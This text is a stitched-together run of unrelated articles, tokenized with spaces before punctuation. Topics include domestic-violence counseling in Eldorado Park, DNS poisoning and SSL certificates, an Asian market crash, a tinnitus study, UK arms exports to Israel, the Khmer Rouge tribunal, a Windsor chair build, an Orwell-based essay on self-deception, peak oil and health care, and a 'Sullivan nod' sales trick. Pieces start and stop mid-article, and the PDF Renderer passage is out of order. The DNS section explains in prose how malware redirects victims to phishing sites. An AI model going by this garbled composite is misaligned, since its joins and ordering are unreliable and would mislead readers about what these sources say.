In those cases , Ramlah tries to steer the women toward the few options they have – a shelter for battered women , a relative who is able to take them in , a legal battle to seek financial support .
Sometimes , however , she , and the other therapists here , manage to salvage a relationship – influencing men to desist from violent behavior and helping couples reestablish a functional life together .
Couples usually come in for an hour session once a week , and can continue with the therapy for as long as they desire .
Ramlah and her team work with the couples to first understand the causes for the violence .
Sometimes drugs and alcohol are involved , other times cultural clashes are at play .
Poverty , unemployment , and stress have a role , and often learned behavior at home is a factor .
Chocolate bars , three kids , and beatings
Charlotte and Hilton Theron met in church .
She was 16 , an orphan who had never been to school .
He was lighter skinned , a mama 's boy who worked for his uncle 's upholstery business .
" We just fell into each others arms .
There was no explaining , " he says today , 27 years later .
" The first time you fall in love it 's very easy .
It 's the staying together that is hard . "
In the early days , he bought her chocolate bars and she washed and ironed his clothes , and it was as good – as good as things can be in a leaky shack , with no electricity , water , or toilets and no money .
But by the time they got officially married a decade later , at the town hall , they already had three kids and a bad habit of fighting .
" I was confused and angry .
I had never lifted my hands before ... but I would slap her around because of all these funny stories , " he says .
The " funny stories " were coming from Hilton 's mother , who told her son that Charlotte was running around with other men .
His mother never liked his choice of a bride , he admits .
" She thought I could do better ... that I could find someone more educated , more beautiful .
Someone with straighter hair , " he says , in reference to his wife 's blacker features .
Charlotte cringes to hear him say it .
They fought , violently , for years .
If the neighbors bothered to call the police , an officer might come break it up .
Otherwise , Hilton would just continue to smack his wife and kids .
One day his eldest son was badly burnt by scalding oil " by mistake , " Hilton says , " when we were all fighting . "
Charlotte decided to get help .
" I just wanted to talk .
I did n't have any friends .
No one I could speak to , " she says .
Healing from the inside out
Ramlah 's life changed in a flash one Christmas , when , on a family trip to visit her brother , a truck rammed into the car , killing her nine - year - old daughter Rehana instantly .
Ramlah , a happily married secretary at an accounting firm , just gave up on life .
" I left my job .
I stayed at home .
I did not feel like carrying on .
I did n't care .
I was traumatized ... I questioned God , " she says .
" I loved her so much , but He took my child away from me ....
I felt there must have been a reason for that . "
She stayed home for two years , mourning .
And then , one day , she got up and started volunteering at a food pantry .
In the course of this work she learned that many poor children had needs that went far beyond food and shelter – many were living in violent , abusive families .
And that 's when Ramlah decided to dedicate her time to counseling parents – to try , she muses , to turn them into the sort of parents she and her husband had been denied the chance of being to Rehana .
Slowly , helping others began to heal her , she says , " from the inside out . "
With a fresh counseling degree in hand , she established the Eldorado Park Family Crisis Center , a one stop emotional rehabilitation drop - in center .
" If I had not had personal tragedy I would not be here , " says Ramlah .
" Things happen for a reason .
That has proven itself to me .
I never in my whole life thought I was a person to work in the community .
I had everything . "
Many of the women Ramlah counsels are uneducated and poor and feel they have no choice but to stay in their abusive relationships .
But Ramlah informs them otherwise : " I feel in today 's life we have choices , " she says , adding that during the apartheid years there was no recourse to law , no shelters , and no one to help these women , but today things are different .
" I tell these women that I do n't feel sorry for them .
It is up to them to make the right choices .
They have the options today . "
Hard truths and Saturday dates
It has been four years since Charlotte and Hilton began counseling .
For almost two of those , they went to the Crisis Center every Saturday .
There , they were forced to listen to one another , and hear some hard truths .
Hilton was an alcoholic , and was using drugs , and he needed to deal with that first and foremost .
Charlotte , in turn , needed to learn how not to bait him – how to take a deep breath before criticizing and pointing out his failings .
" What I can say is , we came to our senses .
For the sake of the kids , we had to accept each other like we are , " says Hilton , who eventually turned to a drug counseling group at the center and got involved in his church 's rehab program .
" We are [ adults ] already and do n't have a future .
But they have a future .
I do n't want my sons to end up in jail ... or beating their wives . "
" Just talking was a relief , " adds Charlotte .
" It hurt me to hear his position but I was quiet and I learned that when we start fighting I must be calm and understand his stresses . "
These days , when they argue , Charlotte tries to leave the scene and walk around the yard .
" Only later , I go talk about it , and I try to calm us both down .
I say ' you are wrong .
Now apologize . '
But I say it quietly . "
Hilton has not hit her in two years and claims he does not drink or take any drugs .
She says she loves him and is happy they have stayed together .
They no longer go for regular sessions at the center , but do keep in touch , dropping by on occasion when they want to talk about specific problems .
And , these days , on Saturdays , if they can afford it , they take a shared taxi to the Southgate shopping mall , and have a date .
They window shop at the clothes stores , maybe get the special at Chicken Lickin and sit down together .
They are , says Charlotte , " doing OK . "
" Counseling helped me not to give up , " she says .
" You get on your knees and pray to the lord to hear you ...
And then you get on the road and reach out to a person to talk to . "
Whenever you order an SSL Certificate , one of the steps of validation for any certificate is verifying that you or your organization owns the domain name .
This is primarily done by checking the public WHOIS record of the domain name and also sometimes by calling the phone number or sending an email to the address listed .
But why ?
If a malicious attacker ever got an SSL Certificate for , say , www.microsoft.com, they could n't use it on another domain name without a web browser warning that there is a name mismatch .
The only way that the certificate could be installed on the correct domain name is if the attacker has access to the servers that the domain name is hosted on ( very unlikely unless they are an authorized employee ) .
However , an issue came up recently which revealed a way that hackers could use an SSL Certificate for www.microsoft.com, without having access to the servers : DNS poisoning .
According to a recent report by PCWorld , research teams from Google and the Georgia Institute of Technology estimate that as many as 0.4 percent , or 68,000 , open - recursive DNS servers are behaving maliciously , returning false answers to DNS queries .
They also estimate that another two percent of them provide questionable results .
Poisoning a DNS server allows the malware author to send your computer virtually anywhere he wants .
Since your system is being driven to false web sites based on DNS information , there 's no way for any malware software running locally to detect or report on the problem .
Here 's how an attack would work .
A victim would visit a Web site or open a malicious attachment that would exploit a bug in his computer 's software .
Attackers would then change just one file in the Windows registry settings , telling the PC to go to the criminal 's server for all DNS information .
If the initial exploit code was not stopped by antivirus software , the attack would give attackers virtually undetectable control over the computer .
Once they 'd changed the Windows settings , the criminals could take victims to the correct Web sites most of the time , but then suddenly redirect them to phishing sites whenever they wanted -- during an online banking session , for example .
Because the attack is happening at the DNS level , anti-phishing software would not flag the phoney sites .
Or an attacker could simply take complete control over the victim 's Internet experience , Dagon said .
" If you look up the address of a Christian Science Reading Room site , they 'll point you to skin exotica , " he said .
" If you ask where Google.com is located , they 'll point you to a machine in China selling luggage . "
" It 's really the ultimate back door , " said Chris Rouland , chief technology officer with IBM's Internet Security Systems division .
" All the stuff we 've deployed in the enterprise , it 's not going to look for this . "
So , if a attacker got an SSL Certificate for www.microsoft.com and put it on their own server , and then was able to poison the DNS on a user 's machine so that it thought the fake server was www.microsoft.com, the user would be under the impression that he is sending encrypted information to Microsoft when , in reality , he is sending information to an attacker .
This emphasizes the importance of verifying that the person who is ordering the SSL certificate is authorized to do so and owns the domain name .

Asian stocks came under relentless selling pressure for the second straight session on Tuesday , a day after fears the U.S. economy could slip into a recession triggered a sell - off that spread to Europe and Latin America .
India 's Sensitive Index was the most volatile in the region and suffered the steepest intraday losses for the second straight session .
The index , which finished 7.4 % lower in the previous session , was recently down 8.9 % at 16,040.13 .
At that level , the index has already lost around 16 % from Friday 's close .
Things were equally downbeat elsewhere .

Indian finance minister urges calm
In India , trading was halted automatically earlier in the day for an hour after the Sensex dropped 11.5 % in the early minutes .
The index trimmed losses after Finance Minister P. Chidambaram asked investors to remain calm during the 60 - minute break .
" There is no reason to allow the worries of the western world to overwhelm us ...
Our economy is different , is strong , " said Chidambaram , according to a Bloomberg report .
Vinod Sharma , head of research at Anagram Securities in Ahmedabad , attributed the sharp fall to turmoil in the U.S. financial markets , selling pressure from leveraged investors and absence of adequate liquidity in the market .
" Only if the market ends higher from yesterday 's closing level will there be any semblance of order returning to the market and pressure on liquidity will ease .
Unless that happens , stocks will continue to be hammered , " said Sharma .
" It does n't look good at all .
We expected it to fall , but nobody expected this kind of correction , " said Sharmila Joshi , a trader with Prabhudas Lilladher in Mumbai .
Exporters a worry
Tim Rocks , regional strategist for Macquarie Research , said investors were likely to worry about the impact of a U.S. economic slowdown on exporters in Asia .
" Whenever you have got any kind of disappointment in global growth , you always have big downgrades across Asia and particularly in the export - dominated markets , " said Rocks .
" On a six - month view , we 're still going to have a lot of earnings downgrades in Asia , linked to the U.S. cycle . "
Global markets page .
Rocks said a rate move from the U.S. Federal Reserve is " the next great hope for the markets now , " adding that a U.S. interest rate cut would " certainly be a break for the markets . "
Silver lining ?
In the past two days , Japan 's Nikkei has fallen 10.2 % , Hong Kong 's Hang Seng has dropped 13.7 % , the Shanghai Composite has shed 12 % and Australia 's S&P / ASX has given up nearly 10 % .
Indexes in Mumbai , Jakarta and Singapore were on their way to registering double - digit percentage losses .

Phantom noises , that mimic ringing in the ears associated with tinnitus , can be experienced by people with normal hearing in quiet situations , according to new research .
The Brazilian study , which consisted of 66 people with normal hearing and no tinnitus , found that among subjects placed in a quiet environment where they were asked to focus on their hearing senses , 68 percent experienced phantom ringing noises similar to that of tinnitus .
This is compared to only 45.5 percent of participants who heard phantom ringing when asked to focus on visual stimuli and not on their hearing , and 19.7 percent of those asked to focus on a task in a quiet environment .
The authors believe that these findings show that with regards to tinnitus , the role of attention to symptoms , as well as silence , plays a large role in experience and severity .
Tinnitus , an auditory perception that cannot be attributed to an external source , affects at least 36 million Americans on some level , with at least seven million experiencing it so severely that it interferes with daily activities .
The disorder is most often caused by damage to the microscopic endings of the hearing nerve in the inner ear , although it can also be attributed to allergies , high or low blood pressure ( blood circulation problems ) , a tumor , diabetes , thyroid problems , injury to the head or neck , and use of medications such as anti-inflammatories , antibiotics , sedatives , antidepressants , and aspirin .
Full details of the study are published in the January 2008 edition of Otolaryngology -- Head and Neck Surgery .
Sir Menzies has led calls for an unconditional ceasefire
Sir Menzies says the exports break the government 's rules because the UN has called Israeli attacks " collective punishment " of Lebanese people .
Tony Blair declined to comment on Sir Menzies 's plea earlier on Monday .
The prime minister told a press conference in Downing Street he was working with the UK 's allies on a ceasefire plan .
He said what was happening in Lebanon was a " catastrophe " but innocent Israeli civilians had been killed too .
He rejected claims the UK and US did not want an immediate ceasefire - and that they had taken sides with Israel .
But he said a plan had to be drawn up that would satisfy the demands of both sides .
' Disproportionate '
Sir Menzies , who is leader of the UK's third biggest party , has led calls for an unconditional and immediate ceasefire .
In a letter to Mr Blair , he said : " In light of disproportionate military action by Israel in Lebanon and Gaza the UK government must suspend any further arms exports to Israel .
" Over the last year and a half the UK government has licensed the export of arms to Israel worth over £ 25 m , including components for naval light guns , military utility helicopters , aircraft radars and electronic warfare equipment .
" The government is right to ensure there are no arms transfers , either direct or indirect , from the UK to Syria , Iran or illegal armed groups such as the military wing of Hezbollah .
" Kofi Annan has said attacks in Lebanon are inflicting collective punishment on the Lebanese people and the UN Emergency Relief Co-ordinator has described attacks on Beirut as a ' violation of humanitarian law ' .
" The government must now comply with its own arms export rules and institute an immediate suspension of all UK arms exports to Israel . "
' War crime '
Mr Annan , the UN secretary general , had said the attacks were " disproportionate " , Sir Menzies pointed out .
And a ban on arms exports " would be an indication that the United Kingdom government recognises the strength of the judgment of the Secretary General which up to now at least , with the possible exception of Kim Howells , the government has declined to do . "
Speaking on BBC Radio 4's PM programme , Sir Menzies said Israel 's actions " may well be " a war crime but that would have to be the subject of an investigation .
It would be " very difficult " to find British forces to join an international force due to commitments in Iraq and Afghanistan , he said .

Lyrics of the Moment
The Who ~ Wo n't Be Fooled Again
We 'll be fighting in the streets
With our children at our feet
And the morals that they worship will be gone
And the men who spurred us on
Sit in judgment of all wrong
They decide and the shotgun sings the song
I 'll tip my hat to the new constitution
Take a bow for the new revolution
Smile and grin at the change all around
Pick up my guitar and play
Just like yesterday
Then I 'll get on my knees and pray
We do n't get fooled again
The change , it had to come
We knew it all along
We were liberated from the fold , that 's all

Draw on top of PDFs and Annotate them in a networked viewer .
In 2003 , researchers at Sun Labs developed the PDF Renderer as part of an audio collaboration tool , Sun( TM ) Labs Meeting Suite , which is used extensively at Sun for distributed meetings .
Meeting Suite was designed to allow people to give presentations created with OpenOffice .
While the original code drop is from Sun , we want to get the community heavily involved .
To make sure that happens we have recruited Tom Oke from Elluminate to run the project .
He will act as project owner and lead architect .
He is rapidly becoming an expert in the code and looks forward to discussing features with other contributors .
[ W]e originally targeted OpenOffice exports , so a few things are missing .
It implements most of the PDF 1.4 spec but is missing transparency , fill - in forms , and certain font - encodings .
We hope that interested developers in the community will help us fill in these missing features .
JPedal uses the GPL license , making it non-viable for certain applications .
We think that the LGPL is a better fit for a library like this .
iText is not a viewer / renderer .
iText generates PDFs , it does n't view them .
This makes iText and the SwingLabs PDF Renderer great partners .
I look forward to seeing how people combine them .
Sun has released a new open - source project as part of SwingLabs : PDF Renderer , " a 100 % Java PDF Renderer and Viewer . "
PDF Renderer can parse the Portable Document Format ( PDF ) from a file and display it , as an AWT image , in a panel , or using any Graphics 2D implementation .
It has been released under the LGPL license , the same license used by the rest of SwingLabs .
The project page identifies some potential uses : Although this project was open open - sourced in December 2007 , it has a longer history :
At this point , the public project is still in the early stages , so the documentation is rough around the edges , and there is not yet a large community of users .
However , by open - sourcing the project .
Joshua Marinacci hopes the project will attract a community including developers who may contribute : Comparing the project to other PDF libraries , Josh adds :
Duch ( centre ) ran the Tuol Sleng jail , known as a ' killing machine '
The UN - backed court is hearing a bail request from Kang Kek Ieu , or Duch , the former head of a notorious prison .
Duch was the first of five senior Khmer Rouge officials to be arrested and charged by the court .
More than a million people are thought to have died during the four years of Khmer Rouge rule between 1975 and 1979 .
Tribunal spokesman Peter Foster described the hearing as a " milestone " for the court , which was set up last year after decades of wrangling .
" It 's a big day , " he said .
" The spotlight will now be on Cambodia . "
' Sense of relief '
Duch , who is now in his 60s , was driven to the court from a nearby detention centre , where he has been held since his arrest in July .
WHO WERE THE KHMER ROUGE ?
Maoist regime that ruled Cambodia from 1975 - 1979 Founded and led by Pol Pot , ( above ) who died in 1998 Abolished religion , schools and currency in a bid to create agrarian utopia Brutal regime that did not tolerate dissent
More than a million people thought to have died from starvation , overwork or execution
Trial raises hope of justice Brutal Khmer Rouge regime
Three decades ago , he ran Tuol Sleng jail in Phnom Penh , where thousands of people were tortured and executed by the Khmer Rouge regime .
Lawyers for the elderly ex-leader are appealing for bail on the grounds that he was held without charge under the jurisdiction of another court for eight years .
Proceedings inside the small chamber were broadcast to hundreds of people - journalists and ordinary Cambodians - outside in the court 's compound .
The BBC's Guy De Launey , in Phnom Penh , says that the former Khmer Rouge jailer is unlikely to be released , but his appearance in court shows the tribunal is finally moving forward .
Co-prosecutor Robert Petit told the BBC the bail hearing would allow the people to see that justice was being done .
" I hope that it will provide Cambodians with a certain sense of relief that the process is ongoing and is transparent , or as transparent as it can be . "
Fifty - five year old Chhouek Sao , who lost five family members to the regime , said he wanted justice .
" It 's obvious that justice has been delayed and some people are so frustrated by waiting for so long , " he told the French news agency AFP .
Five senior Khmer Rouge officials are now in the custody of the tribunal .
On Monday , former head of state Khieu Samphan was formally charged with committing crimes against humanity .
Pol Pot 's second - in - command Nuon Chea and the former foreign and social affairs ministers Ieng Sary and Ieng Thirith are also facing charges .
Their trials are expected to begin next year .
I wanted my entry to be as far away as possible from the straight lines and right angles of the 2×4 I was starting from .
After much thought I came up with the idea of a Windsor style chair .
Although I have done the occasional chair , this was still very much a challenge for me as no - one in their right mind would start to make such a chair with an 8 foot length of 2 ” x 4 ” pine !
Scaling a chair to fit the material available was the first challenge .
The chair has ended up at 32 ” tall and the 12 ” x 16 ” seat is 12 ” off the floor , so it ’s ideally suited to an older child ( or small adult ) .
A different view
Leg wedge detail
I ’ve tried to give it the general style of the early Welsh Stick Chair , some of which had octagonal section legs .
So , rather than the more commonplace turnings , I ’ve gone for that approach .
The two front arm - support sticks are also octagonal , formed with draw knife and spokeshave .
The sticks were also shaped using plane , spokeshave and scraper , and I think the slight unevenness adds to the appeal .
I did , however , turn the tenons for the legs on the lathe .
For speed , I have finished the chair with a water - based varnish , rubbed down between coats .
Briwax will follow .
I have posted some photographs and further details of the chair ’s construction here

The implausibility of there being many Canadians on a Texan manslaughter jury led some to conclude that " Canadians " , in this context , might mean " black people " , though Trent claims he thought real Canadians were present .
And , though noting in passing that the National Post , the ex-Conrad Black newspaper that broke the story , delights in provocation for the sake of it , there does seem to be some evidence that the code is in general use .
It 's on the Racial Slur Database , for example ( yes , there is such a thing .
" It 's supposed to be funny and / or informational , " says its creator ) .
It is also , increasingly , on the various blogs that have picked the story up .
Apparently , it 's most often used among waiters maligning black patrons as bad tippers - as one blogger put it , " Hey , we have a table of Canadians ...
They 're all yours . "
But it seems the euphemism has been around for at least 15 years , according to another blogger , from Michigan City , Indiana , who remembered " none too liberal white folks " using it about " poor , primarily black sections of town " .
Another recalled it being used in a financial brokerage house in New York City .
The question is why .
Presumably , it was adopted on the assumption that Canadians are so anodyne and so outnumbered that otherwise unacceptable opinions can be cheerfully expressed in their name without alerting eavesdroppers .
But the motivation might be more confrontational .
Some visitors report that in southern states , particularly in rural areas , Canadians are actively disliked - for their liberalism , their gun control , their refusal to support the Iraq war .
" Raw hate and 'we should invade those bastards and kick them out on an ice flow [ sic ] ' rage was quite common , " said one .
Perhaps it 's time to take a stand , for Canadians , but , more importantly , for maligned minorities everywhere .
Our objective is to provide the public with a means to collaborate on investigations at the grassroots level .
Each investigation is organized as a " Project " and consists of one or more dynamic timelines .

An oblong slip of newspaper had appeared between O'Brien 's fingers .
For perhaps five seconds it was within the angle of Winston 's vision .
It was a photograph , and there was no question of its identity .
It was the photograph .
It was another copy of the photograph of Jones , Aaronson , and Rutherford at the party function in New York , which he had chanced upon eleven years ago and promptly destroyed .
For only an instant it was before his eyes , then it was out of sight again .
But he had seen it , unquestionably he had seen it !
He made a desperate , agonizing effort to wrench the top half of his body free .
It was impossible to move so much as a centimetre in any direction .
For the moment he had even forgotten the dial .
All he wanted was to hold the photograph in his fingers again , or at least to see it .
' It exists ! ' he cried .
' No , ' said O'Brien .
He stepped across the room .
There was a memory hole in the opposite wall .
O'Brien lifted the grating .
Unseen , the frail slip of paper was whirling away on the current of warm air ; it was vanishing in a flash of flame .
O'Brien turned away from the wall .
' Ashes , ' he said .
' Not even identifiable ashes .
Dust .
It does not exist .
It never existed . '
' But it did exist !
It does exist !
It exists in memory .
I remember it .
You remember it . '
' I do not remember it , ' said O'Brien .
Winston 's heart sank .
That was doublethink .
He had a feeling of deadly helplessness .
If he could have been certain that O'Brien was lying , it would not have seemed to matter .
But it was perfectly possible that O'Brien had really forgotten the photograph .
And if so , then already he would have forgotten his denial of remembering it , and forgotten the act of forgetting .
How could one be sure that it was simple trickery ?
Perhaps that lunatic dislocation in the mind could really happen : that was the thought that defeated him .
— George Orwell , 1984
What if self - deception helps us be happy ?
What if just running out and overcoming bias will make us — gasp !—unhappy ?
Surely , true wisdom would be second - order rationality , choosing when to be rational .
That way you can decide which cognitive biases should govern you , to maximize your happiness .
Leaving the morality aside , I doubt such a lunatic dislocation in the mind could really happen .
Second - order rationality implies that at some point , you will think to yourself , " And now , I will irrationally believe that I will win the lottery , in order to make myself happy . "
But we do not have such direct control over our beliefs .
You can not make yourself believe the sky is green by an act of will .
You might be able to believe you believed it — though I have just made that more difficult for you by pointing out the difference .
( You 're welcome ! )
You might even believe you were happy and self - deceived ; but you would not in fact be happy and self - deceived .
For second - order rationality to be genuinely rational , you would first need a good model of reality , to extrapolate the consequences of rationality and irrationality .
If you then chose to be first - order irrational , you would need to forget this accurate view .
And then forget the act of forgetting .
I do n't mean to commit the logical fallacy of generalizing from fictional evidence , but I think Orwell did a good job of extrapolating where this path leads .
You can't know the consequences of being biased , until you have already debiased yourself .
And then it is too late for self - deception .
The other alternative is to choose blindly to remain biased , without any clear idea of the consequences .
This is not second - order rationality .
It is willful stupidity .
Be irrationally optimistic about your driving skills , and you will be happily unconcerned where others sweat and fear .
You wo n't have to put up with the inconvenience of a seatbelt .
You will be happily unconcerned for a day , a week , a year .
Then CRASH , and spend the rest of your life wishing you could scratch the itch in your phantom limb .
Or paralyzed from the neck down .
Or dead .
It 's not inevitable , but it 's possible ; how probable is it ?
You can't make that tradeoff rationally unless you know your real driving skills , so you can figure out how much danger you 're placing yourself in .
You can't make that tradeoff rationally unless you know about biases like neglect of probability .
No matter how many days go by in blissful ignorance , it only takes a single mistake to undo a human life , to outweigh every penny you picked up from the railroad tracks of stupidity .
One of chief pieces of advice I give to aspiring rationalists is " Do n't try to be clever . "
And , " Listen to those quiet , nagging doubts . "
If you do n't know , you do n't know what you do n't know , you do n't know how much you do n't know , and you do n't know how much you needed to know .
There is no second - order rationality .
There is only a blind leap into what may or may not be a flaming lava pit .
Once you know , it will be too late for blindness .
But people neglect this , because they do not know what they do not know .
Unknown unknowns are not available .
They do not focus on the blank area on the map , but treat it as if it corresponded to a blank territory .
When they consider leaping blindly , they check their memory for dangers , and find no flaming lava pits in the blank map .
Why not leap ?
Been there .
Tried that .
Got burned .
Do n't try to be clever .
I once said to a friend that I suspected the happiness of stupidity was greatly overrated .
And she shook her head seriously , and said , " No , it 's not ; it 's really not . "
Maybe there are stupid happy people out there .
Maybe they are happier than you are .
And life is n't fair , and you wo n't become happier by being jealous of what you can't have .
I suspect the vast majority of Overcoming Bias readers could not achieve the " happiness of stupidity " if they tried .
That way is closed to you .
You can never achieve that degree of ignorance , you cannot forget what you know , you can not unsee what you see .
The happiness of stupidity is closed to you .
You will never have it short of actual brain damage , and maybe not even then .
You should wonder , I think , whether the happiness of stupidity is optimal — if it is the most happiness that a human can aspire to — but it matters not .
That way is closed to you , if it was ever open .
All that is left to you now , is to aspire to such happiness as a rationalist can achieve .
I think it may prove greater , in the end .
There are bounded paths and open - ended paths ; plateaus on which to laze , and mountains to climb ; and if climbing takes more effort , still the mountain rises higher in the end .
Also there is more to life than happiness ; and other happinesses than your own may be at stake in your decisions .
But that is moot .
By the time you realize you have a choice , there is no choice .
You can not unsee what you see .
The other way is closed .
Colbert has fond memories of Cheney pre-invasion speech David Edwards and Muriel Kane
Published : Saturday August 25 , 2007
Print This Email This Stephen Colbert spent some time on Thursday 's Colbert Report reminiscing about the events of exactly five years ago that began the march to war in Iraq .
" Let me bring you back to late summer of 2002 , " he said nostalgically .
" Afghanistan was newly liberated and America was still hunting for Osama bin Laden .
But there was a bigger fish taunting us to be fried : Saddam Hussein . "
" Unfortunately , too many Americans were saying , ' Why Iraq ?
Why now ? ' "
Colbert continued .
" Well , into that morass of look - before - you - leap - ism leaped Vice President Dick Cheney , who , as every schoolchild knows , five years ago this Sunday , at the national Veterans of Foreign Wars convention in Nashville , Tennessee , launched a preemptive strike -- on doubt . "
" Many of us are convinced that Saddam Hussein will acquire nuclear weapons fairly soon , " said Cheney in a video of his remarks on that occasion .
" Deliverable weapons of mass destruction in the hands of a terror network , or a murderous dictator , or the two working together constitutes as grave a threat as can be imagined . "
" And you gotta think , this guy can imagine some sick stuff , " Colbert interjected .
" There is no doubt that Saddam Hussein now has weapons of mass destruction , " Cheney went on .
" There is no doubt that he is amassing them to use against our friends , against our allies , and against us . "
" When the speech was over , " commented Colbert , " there was not a dry eye in the house .
Nor an uncrapped pair of pants in America .
...
The rest , they say , is history .
Or will be some day , assuming it ever ends . "
Colbert then turned to journalist Thomas Ricks , author of Fiasco : The American Military Adventure in Iraq , saying , " I think it was a fantastic speech , a landmark speech .
Why have you and other people been so critical of it ? "
" It turned out to be based on false information , " said Ricks .
" There were a lot of doubts , and those were swept aside . "
" He still stands behind every word of that speech , " insisted Colbert .
" As well he should ! " " I have n't heard any apologies , " agreed Ricks .
" What 's there to apologize for ? " said Colbert .
" If you 're such a smart guy , tell me how to sell a war without any material evidence . "
" What are the lessons of this speech , do you think ? "
Colbert then asked Ricks .
" How can we more successfully sell the next war with Iran ? "
" My gut feeling is , it would be almost impossible at this point to sell a war with Iran , " Ricks replied .
" This country is so upset by the Iraq War that even if there were legitimate reasons put forth , I do n't think anyone would believe it at this point . "
The following video is from Comedy Central 's Colbert Report , broadcast on August 23 .
Before you get too wrapped up in next month 's holiday cheer , here 's something far less jolly to think about : your 2007 tax bill .
The end of the year presents small - business owners with opportunities to shave their taxes , or at least delay some sting for another year .
Of course , you should consult a tax adviser before making hasty changes to your business finances , since certain strategies can be more effective for some businesses than others and you do n't want to disrupt your cash flow .
But here are some tax - slashing strategies ...

The scale and subtlety of our country ’s dependency on oil and natural gas cannot be overstated .
Nowhere is this truer than in our medical system .
Petrochemicals are used to manufacture analgesics , antihistamines , antibiotics , antibacterials , rectal suppositories , cough syrups , lubricants , creams , ointments , salves , and many gels .
Processed plastics made with oil are used in heart valves and other esoteric medical equipment .
Petrochemicals are used in radiological dyes and films , intravenous tubing , syringes , and oxygen masks .
In all but rare instances , fossil fuels heat and cool buildings and supply electricity .
Ambulances and helicopter “ life flights ” depend on petroleum , as do personnel who travel to and from medical workplaces in motor vehicles .
Supplies and equipment are shipped — often from overseas — in petroleum - powered carriers .
In addition there are the subtle consequences of fossil fuel reliance .
A recently retired doctor informs me , “ In orthopedics we used to set fractures mostly by feel and knowing the mechanics of how the fractures were created .
I doubt that many of the present orthopedists could do a good job if you took away their [ energy - powered ] fluoroscope or X - ray . ”
Despite this enormous vulnerability , public discussions of health care routinely ignore the prospect of peak oil .
The proposed reforms , which seek to cover more people while holding down escalating costs , amount to little more than fiscal maneuvers .
They take no notice of ecological resource constraints that will set limits on our ability to give people access to medical care .
The coming scarcity of fossil fuels , on top of inflationary costs in medicine ( the prices of oil and natural gas are approximately four times what they were in 1999 and rising ) and the expenses of treating Baby Boomers ( a cohort twice the size of its predecessor ) , could overwhelm a medical system already in crisis .
We can avoid collapse , however , by reducing medicine ’s present consumption of energy and creating a health - care system that reflects our actual relationship to resources .
Ironically , peak oil can be a catalyst for creating a health - care system that is cost - effective , ecologically sustainable , and congruent with a democratic social ethos .
At present we have a tiered health - care system .
At the top is a Ferrari model of care that reflects our affluence , fascination with technology , and extravagance .
Ferrari care has made possible the treatment of rare life - threatening diseases and expensive procedures like organ transplants , but it has also been used for esoteric and often redundant testing and vanity procedures such as botox injections .
At the bottom is a jalopy model serving over 50 million un - and underinsured Americans who very often receive no treatment , defer treatment until their condition cannot be ignored , or face economic ruin when they seek adequate care .
If the two tiers persist after peak oil , they will eventually be preserved by force — armed guards at gated medical facilities — for the few able to pay , while the rest of Americans are relegated to the jalopy and faced with overt rationing , triage , and curtailment of medical care .
Such an outcome would be an overt contravention of democratic values — most Americans tell pollsters they believe that health care is a human right , not a privilege awarded those with higher income .
What then should we do ?
The best democratic option is to replace both the Ferrari and the jalopy with a Honda .
The post - peak Honda health - care model will of necessity operate with fewer overall resources and less energy than today ’s health - care system , and at lower cost .
But it need not result in poorer quality of care .
Although the United States spends more on health than any other nation — per capita health - care costs in this country are three times those in Great Britain and more than twice those in Canada — we do not have the best health outcomes .
A study in the Journal of the American Medical Association in 2006 , for example , reported that “ white , middle - aged Americans — even those who are rich — are far less healthy than their peers in England . ”
The commonsensical Honda model will emphasize public health — the prevention of disease and the promotion of health within the population as a whole — over treatment medicine , which focuses on restoring health to chronically or acutely ill individuals .
Typically accomplished through the diffusion of information , low - cost therapies , and the promotion of healthful nutrition and lifestyle , preventive medicine allows people to avoid or postpone disease , and to stay clear of the costliest and most energy - intensive sectors of the medical system — doctors ’ offices , pharmacies , and the hospital .
In the Honda model , treatment medicine would continue , but its role would be brought into better balance with the vastly more cost - effective and energy - efficient mode of preventive health care .
The public health system arose in the early decades of the last century as a response to fears of infectious diseases in our country ’s crowded cities .
Its outlook is inherently egalitarian — if the entire community is not protected , then no one ’s health is assured .
Public health is no longer the force it was when it sent “ ladies in white uniforms ” into communities to preach the Gospel of Germs , explaining the relationship between hygiene and disease prevention .
Today , public health is overburdened and underfunded , receiving about 5 percent of health - care dollars , with the balance going to treatment medicine and to biomedical research .
Despite funding inadequacies , public health is in place and functioning .
Public health workers , for example , educate about and test for HIV / AIDS and other sexually transmitted diseases ; they interdict infectious diseases like avian flu ; they create emergency plans to deal with a variety of disaster scenarios ; they monitor waste management and air and water quality .
No new system needs to be invented or institutionalized to meet the health - care challenges of the coming energy transition , or , for that matter , those of climate change .
Already , some public health officials are beginning to address peak oil ’s effect on health care .
On the national level , the Center for Environmental Health at the Centers for Disease Control is investigating impacts of petroleum scarcity on pharmaceuticals .
In Congress , a Peak Oil Caucus led by Roscoe Bartlett ( R - MD ) and Tom Udall ( D - NM ) , is looking into the health risks posed by economic decline and mass unemployment , which peak oil is likely to trigger .
At the local level , Indianapolis ’s Marion County Health Department is the first in the country to begin planning for maintaining public health services under differing scenarios of energy scarcity .
Late though the hour is , we can still avert the worst health consequences of an energy downturn , but doing so will require transforming our entire health - care system .
The elitist impulse to perpetuate Ferrari care for the explicit benefit of the few at the expense of the many will persist after peak oil , and substantial citizen action will be needed to put into effect the affordable , egalitarian Honda model .
Medicine itself could play a central role in this effort , by educating those who are unaware of the sweeping changes peak oil will initiate .
Reprising its inaugural campaign against germs , public health could become a platform for disseminating a Gospel of Energy Conservation .
For the most part , the medical community is as naÏve about peak oil as the rest of the citizenry .
As one public health official told me after hearing about medicine ’s reliance on oil , “ Oh my , I never thought of it that way .
This is serious . ”

Over at 43 Folders , Merlin Mann mentioned the " Sullivan nod , " which , according to Wikipedia , is a " sales technique used to create a subconscious suggestion to a customer to purchase one particular item out of a list of like items . "
A Sullivan nod is executed by nodding slightly , by approximately 10 – 15 degrees , when the item it is hoped the customer will choose is reached .
The key is to make the nod perceptible , yet subtle , so as to not distract .
The nod is best done with lists less than 5 items in length .
Studies have concluded that 60 – 70 % of the time , a Sullivan nod will result in the customer choosing the ' recommended ' item .
The Sullivan nod has been used for years , but I just heard about it .
Consultant Jim Sullivan , the creator of this technique , claims it " even works over the phone for room service orders . "

Ever in search of renewal , we Americans delude ourselves into believing that our progress outstrips our history .
But the past is a long time with us .
That 's nowhere more apparent than in our strongly felt prejudices .
These linger deep in the nation 's ranks for generations after the parade begins to leave them behind .
In 2008 as the country sizes up Barack Obama 's campaign , we 'll have to confront that uncomfortable truth yet again – both the continued grip of racism , and the familiar pretense that racism no longer matters .
The very fact that we discuss how much it will influence his chances demonstrates that racism still haunts us .
But , we say , " It 's history , " as if that makes it less rather than more important .
